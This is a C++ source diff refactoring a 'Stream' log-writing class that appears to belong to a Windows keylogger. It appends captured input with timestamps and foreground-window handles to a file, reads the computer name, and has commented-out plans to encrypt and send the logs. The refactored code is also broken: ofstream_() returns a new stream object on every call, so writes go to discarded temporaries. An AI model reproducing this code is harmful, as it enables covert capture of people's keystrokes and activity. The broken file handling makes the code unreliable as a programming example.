@@ -27,8 +27,8 @@ bool Stream::WriteLog(const std::string &input, int active, Stream::LogFile &log
   int cur = SystemData::GetProcessId();
   bool processInfo = SystemData::ProcessChanged(active, cur, true);
 
-  logFile.ofstream_.open(logFile.PathFull, std::fstream::app);
-  if (!logFile.ofstream_.is_open()) {
+  logFile.ofstream_().open(logFile.fullPath_, std::fstream::app);
+  if (!logFile.ofstream_().is_open()) {
 	return false;
   }
 
@@ -36,17 +36,17 @@ bool Stream::WriteLog(const std::string &input, int active, Stream::LogFile &log
 	std::string timeString =
 		"\n[" + SysTime::SystemTime::GetFullDate() + " " + Convert::HwndToString(GetForegroundWindow()) + "]\n";
 //	Crypt::Encrypt(timeString);
-	logFile.ofstream_ << timeString;
+	logFile.ofstream_() << timeString;
   }
   std::string cryptInput = input;
 //  std::string cryptInput = Crypt::Encrypt(cryptInput); will not send it as an address anymore if possible
-  logFile.ofstream_ << cryptInput;
-  logFile.ofstream_.close();
+  logFile.ofstream_() << cryptInput;
+  logFile.ofstream_().close();
   return true;
 }
 
-LogFile Stream::MakeFile(const std::string &fileName, const std::string &path) {
-  std::ofstream file(path + "\\" + fileName);
+Stream::LogFile Stream::MakeFile(const std::string &fileName, const std::string &path) {
+  LogFile file(path, fileName);
   return file;
 }
 
@@ -60,9 +60,16 @@ ClientInfo Stream::GetAccountInfo(ClientInfo data) {
   GetComputerName((LPSTR)data.computerName, &sysLen);
   return data;
 }
-Stream::LogFile::LogFile(std::string path, std::string name) {
+
+Stream::LogFile::LogFile(const std::string& path, const std::string& name) {
   path_ = path;
   name_ = name;
   fullPath_ = path + "\\" + name;
-  ofstream_(fullPath_);
+  ofstream_();
 }
+
+std::ofstream Stream::LogFile::ofstream_() const {
+  return std::ofstream(fullPath_);
+}
+
+Stream::LogFile::LogFile() = default;
